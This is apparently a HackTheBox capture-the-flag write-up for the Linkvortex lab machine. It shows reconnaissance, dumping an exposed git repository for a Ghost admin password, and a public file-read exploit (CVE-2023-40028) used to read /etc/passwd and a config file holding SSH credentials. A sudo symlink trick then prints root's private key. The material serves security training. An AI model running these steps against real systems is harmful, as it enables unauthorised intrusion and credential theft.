---
title: "HackTheBox - Linkvortex"
author: Nasrallah
description: ""
date: 2025-04-13 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, cve, git, bash]
img_path: /assets/img/hackthebox/machines/linkvortex
image:
    path: linkvortex.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Linkvortex](https://hacktheboxltd.sjv.io/Nasrallah?u=https://hackthebox.com/machines/linkvortex) from [HackTheBox](https://hacktheboxltd.sjv.io/anqPJZ) is running an instance of Ghost vulnerable to file read, on a dev subdomain there is a git repo where we find credentials for ghost allowing us to exploit the vulnerability and gain access to the system. For root we exploit a shell script with sudo entry to read the root's private ssh key.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.254.181
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://linkvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found OpenSSH running on port 22 and Apache web server on port 80 redirecting to `linkvortex.htb`, let's add that to `/etc/hosts` file.

### Web

Let's navigate to the website.

![website](1.png)

This is a blog, the footer says it's `Ghost`.

Checking `Wappalyzer` we find the exact version of the CMS

![wapp](2.png)

It's `Ghost 5.58`.

Checking for vulnerabilities on this version I came across this [Arbitrary File Read](https://security.snyk.io/vuln/SNYK-JS-GHOST-5843513).

We need to be authenticated first to exploit the vulnerability. Let's continue the enumeration.

Let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://linkvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l      157w    10332c http://linkvortex.htb/assets/built/casper.js
200      GET        1l       27w     6743c http://linkvortex.htb/public/cards.min.js
200      GET        1l      583w    35739c http://linkvortex.htb/public/cards.min.css
200      GET        2l       46w    25518c http://linkvortex.htb/favicon.ico
200      GET        2l      769w    39700c http://linkvortex.htb/assets/built/screen.css
200      GET      307l      914w    12148c http://linkvortex.htb/
200      GET       22l      167w     1065c http://linkvortex.htb/LICENSE
301      GET       10l       16w      179c http://linkvortex.htb/assets => http://linkvortex.htb/assets/
301      GET       10l       16w      183c http://linkvortex.htb/partials => http://linkvortex.htb/partials/
200      GET        6l       12w      121c http://linkvortex.htb/robots.txt
403      GET        7l       20w      199c http://linkvortex.htb/server-status
200      GET        1l        6w      527c http://linkvortex.htb/sitemap.xml
```

Nothing look interesting here.

Let's fuzz for subdomains.

```terminal
[★]$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://linkvortex.htb -H "Host: FUZZ.linkvortex.htb" -fw 14

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 14
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 185ms]
```

We found `dev`, let's add it to `/etc/hosts`.

![dev](3.png)

Website is not ready, let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.linkvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w       41c http://dev.linkvortex.htb/.git/HEAD
200      GET        8l       21w      201c http://dev.linkvortex.htb/.git/config
200      GET      115l      255w     2538c http://dev.linkvortex.htb/
200      GET        1l        9w      175c http://dev.linkvortex.htb/.git/logs/HEAD
200      GET       15l       53w      868c http://dev.linkvortex.htb/.git/logs/
301      GET        7l       20w      239c http://dev.linkvortex.htb/.git => http://dev.linkvortex.htb/.git/
200      GET     2172l     8158w   958396c http://dev.linkvortex.htb/.git/index
200      GET      115l      255w     2538c http://dev.linkvortex.htb/index.html
[####################] - 16s     4741/4741    0s      found:8       errors:0      
[####################] - 15s     4724/4724    306/s   http://dev.linkvortex.htb/  
```

We found a `.git` which means the website is running on a git repository.

### Git

We can use a tools called `git-dumper` to download all the files.

```terminal
[★]$ /home/sirius/.local/bin/git-dumper http://dev.linkvortex.htb/.git files
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[...]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```

Great! First I checked is the logs.

```terminal
[★]$ git log --oneline
299cdb4 (HEAD, tag: v5.58.0) v5.58.0
dce2e68 Added Tips&Donations link to portal links (#17580)
3562560 Data generator: Ensure order of newsletters is correct
4ff4677 Entirely rewrote data generator to simplify codebase
cf947bc Optimised react-query caching to prevent excessive requests (#17595)
77cc6df AdminX Newsletters refinements (#17594)
24ea4c0 Updated Tips&Donations portal success and loading states design (#17592)
be7a2d0 Updated Tips & donations settings design (#17591)
7f6de07 Removed unconsistent success state from the donation page (#17590)
7e9b2d4 Fixed donations checkout for logged-off readers (#17589)
19bdb0e Added migrations for Tips & Donations' settings (#17576)
c06ba9b 2023 (2)
265e622 2023
21f57c5 Added remaining wiring to AdminX Newsletters (#17587)
d960b12 Added enable newsletter toggle in AdminX settings (#17582)
af7ce52 Added source to beta editor feedback (#17586)
f26203f Updated Tips & donations settings (#17585)
262c6be 🐛 Fixed member filtering on newsletter subscription status (#17583)
81ef2ad Merged v5.57.3 into main
34b6f19 (grafted, tag: v5.57.3) v5.57.3
c467611 (grafted) Cleaned up AdminX API handling (#17571)
```

Nothing looks interesting here.

Next is checking the status.

```terminal
[★]$ git status       
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        new file:   Dockerfile.ghost
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

There are two files haven't been committed yet.

The `Dockerfile.ghost` tells us that the ghost blog is running on a docker container.

The seconde file sounds interesting and might hold some credentials for Ghost CMS

I grepped for the word password and found a couple but none of them worked on ghost login page.

The `git status` command showed us that the file has been modified but didn't get committed. Let's check what changed using `git diff --staged ghost/core/test/regression/api/admin/authentication.test.js`

```terminal
[★]$ git diff --staged ghost/core/test/regression/api/admin/authentication.test.js
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```

The password changed, let's see if this one works on ghost login `http://linkvortex.htb/ghost/#/signin` `admin@linkvortex.htb:OctopiFociPilfer45`

![login](4.png)

It worked.

## **Foothold**

The POC of the file read vulnerability we found earlier can be found here <https://github.com/0xyassine/CVE-2023-40028>.

Let's download it and change the `GHOST_URL` in the script to `http://linkvortex.htb`.

```terminal
 ./CVE-2023-40028.sh -u 'admin@linkvortex.htb' -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```

The exploit worked.

We found earlier the `Dockerfile.ghost`.

```terminal
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

We see the config file at `/var/lib/ghost/config.production.json`, let's read it.

```json
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
[...]
"mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
```

We got credentials of user bob.

Let's try to ssh to to machine.

```terminal
 ssh bob@linkvortex.htb
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

## **Privilege Escalation**

Let's check our privileges.

```terminal
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

We can run a bash script as root, let's see what it does.

### Code analysis

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

The script checks the safety of symbolic png files.

```bash
if [ -z $CHECK_CONTENT ]; then
  CHECK_CONTENT=false
fi
```

Initializes a flag `CHECK_CONTENT` to `false` if it is not already set. This flag determines whether to display the content of the file the symlink points to later on the script.

```terminal
if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
```

Checks if the file contains `.png`, if not it exists with a message.

```bash
if /usr/bin/sudo /usr/bin/test -L $LINK; then
```

This checks if the file is a symbolic link using `/usr/bin/test -L`.

```bash
LINK_NAME=$(/usr/bin/basename $LINK)
LINK_TARGET=$(/usr/bin/readlink $LINK)
```

- `LINK_NAME`: Extracts the symlink's filename.
- `LINK_TARGET`: Resolves and retrieves the path the symlink points to.

```bash
if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)'; then
  /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
  /usr/bin/unlink $LINK
```

This checks if the symlink points to a file in the directories (/etc or /root) using grep. If true it unlinks the file.

```bash
else
  /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
  /usr/bin/mv $LINK $QUAR_DIR/
```

If the file doesn't point to `/etc or /root` it moves the symlink to `/var/quarantined`.

```bash
if $CHECK_CONTENT; then
  /usr/bin/echo "Content:"
  /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
fi
```

Now if the `$CHECK_CONTENT` is set to true it will print the content of the file.

### Code exploitation

Now we need to read the root ssh key somehow.

To bypass the directory check `/etc|/root` we can create two symbolic links, the first points to `/root/.ssh/id_rsa` and the second points the the first sym link.

```bash
ln -s /root/root.txt /home/bob/first
ln -s /home/bob/first second.png
```

Now we need the script to print out the file.

In the first if statement, it checks for `CHECK_CONTENT` if it's already set, if not it sets it to false.

If we check the sudo -l command we see `env_keep+=CHECK_CONTENT` which means we can set it to `true` before running the script and we can print the file.

Now let's run the script.

```bash
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/second.png
```

```terminal
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/second.png 
Link found [ /home/bob/second.png ] , moving it to quarantine                                  
Content:                                                                                       
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
[...]
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Now we save the key on our machine and give it the 600 permissions then connect with it.

```terminal
[★]$ vim id_rsa
[★]$ chmod 600 id_rsa
[★]$ ssh -i id_rsa root@linkvortex.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

To restore this content, you can run the 'unminimize' command.
Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
root@linkvortex:~#
```

## **References**

<https://security.snyk.io/vuln/SNYK-JS-GHOST-5843513>

<https://github.com/0xyassine/CVE-2023-40028>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
